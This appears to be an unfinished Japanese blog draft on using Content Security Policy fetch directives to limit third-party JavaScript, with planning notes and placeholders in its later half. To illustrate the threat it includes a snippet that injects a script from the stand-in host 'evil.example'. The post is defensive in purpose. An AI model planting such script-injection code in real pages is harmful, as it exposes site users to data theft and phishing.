# CSP（Content Security Policy）Fetch ディレクティブ活用の現実解

こんにちは、エンジニア & 安全確保支援士の中山です。

広告掲載や Web 解析や SNS 連携等を目的として、しばしば Web Application に 3rd-party JavaScript を導入することがあります。一方で 3rd-party JavaScript には Web Application を利用するユーザーに悪影響を与えるリスクが存在するため、導入とあわせたリスク対策も必要となります。そこで、今回の記事では Content Security Policy（以下 CSP）の Fetch ディレクティブを活用した Web Application のセキュリティー強化の取り組みについてお伝えしたいと思います。

## CSP の Fetch ディレクティブとは

詳しくは [W3C 仕様](https://www.w3.org/TR/CSP3/) をご確認頂くとして、CSP の Fetch ディレクティブとはサブリソースの読み込みやインライン JavaScript の実行を制限するための Web ブラウザに対する指示のことです。Web Application が

```
Content-Security-Policy: script-src 'self'
```

のような応答ヘッダを送信したり

```
<meta http-equiv="Content-Security-Policy" content="script-src 'self'" />
```

のような META 要素をコンテンに記載することで、指示に応じた制限が適用され、結果として以下のようなセキュリティー上の効果が期待できます。

- XSS リスクの軽減
- ある 3rd-party JavaScript から piggyback で読み込まれる意図しない 3rd-party JavaScript の実行抑制
- 外部ドメインへの意図しないデータ転送の抑制

## メディアのセキュリティー課題と対策

Web Application のセキュリティー対策と CSP Fetch ディレクティブの関係性についてもう少し詳しく述べたいと思います。

Web Application が 3rd-party JavaScript（例えば広告タグや Web 解析ツール、SNS 連携機能等）を読み込むとき、もし 3rd-party に悪意があったり、悪意はなくとも別な攻撃者に改変されていた場合、Web Application 上に表示されるデータが盗まれたり [フィッシングサイトに誘導](https://blog.techscore.com/entry/2022/08/24/150000) さてしまったり、といったリスクが発生します。

<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec01.png' />

こうしたリスクには Same Origin Policy を利用して 3rd-party JavaScript が実行されるドメインを分離する対策が有効です。

<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec02.png' />

ただし 3rd-party JavaScript がその目的を達成するために Web Application の DOM にアクセスする必要がある場合（例えば広告のビューアビリティー計測など）、ドメインを分離する対策は採用できません。とはいえ、信頼できる安全な 3rd-party JavaScript ならば問題はないでしょう。

<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec03.png' />

ところが、ある事業者の 3rd-party JavaScript から別な事業者の 3rd-party JavaScript が読み込まれるケースも存在します。

<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec04.png' />

例えば Web Application が以下のマークアップを含み

```
<script src='https://hoge.example/hoge.js'></script>
```

さらに hoge.js が以下のようなコードを含む場合に evil.js が読み込まれます。

```
let script = document.createElement('SCRIPT');
script.src = 'https://evil.example/evil.js';
document.getElementsByTagName('SCRIPT').item(0).parentNode.appendChild(script);
```

こうした 3rd-party JavaScript 読み込みが複数回実行されることもあり、そうなるともはや安全性の確認は困難です。行儀の悪い事業者の 3rd-party JavaScript がコンテンツ情報を勝手に収集している … なんてこともあるかもしれません。

<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec05.png' />

このような場合に CSP の Fetch ディレクティブを使うことで、ホワイトリストで許可していないサブリソースの読み込みを制限することができます。

<img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec06.png' />

## CSP による対策と次の課題

Same Origin Policy と

一方でメディアサービスなどの Web Application の場合は多くの 3rd-party JavaScript を導入しています。導入を把握している 3rd-party JavaScript の範囲ならば管理することは可能かもしれませんが、


例えば総務省の

その全ての安全性を確認することは現実的ではないかもしれません。


★例の知らない間に 90 個のタグとか（どこかの引用）

★それを CSP の Fetch ディレクティブで対策
★絵で示す
★ところが 3rd-party ツールの場合のホワイトリスト管理の難しさ

## 現実解の模索

★ティアを分けた対応（ブロック + サンプリングレポートと発見的統制 + 受容）
★イシューととりうる HOW のマトリクス


ゼロリスク = 違反時の停止
	インライン
		とめたいなら nonce
		受容するなら 'unsafe-inline'
	3rd-party JavaScript からの piggyback
		読み込むサブリソースを全てホワイトリスト登録。ただし 3p スクリプトが動作不全
		チェックしないなら strict-dynamic でいい
発見的統制 = 違反時のレポート
	インライン
		レポートしたいなら nonce★XSS のケースのレポートを見てみる
		受容するなら 'unsafe-inline'
	3rd-party JavaScript からの piggyback
		自ドメイン以外をレポートで発見的統制

★これ AI にも聞いてみる

## メディアでのティア 2 実験と今後の運用

★TBD
★定期的にレポートを出しサービスの技術管掌担当にチェックしてもらう

## その他考察

★Proxy とサンプリング
★TM での CSP 配信検討と
★nonce 面倒
★まとめとして（AI 先生に言われたような内容で）セキュリティー強化を



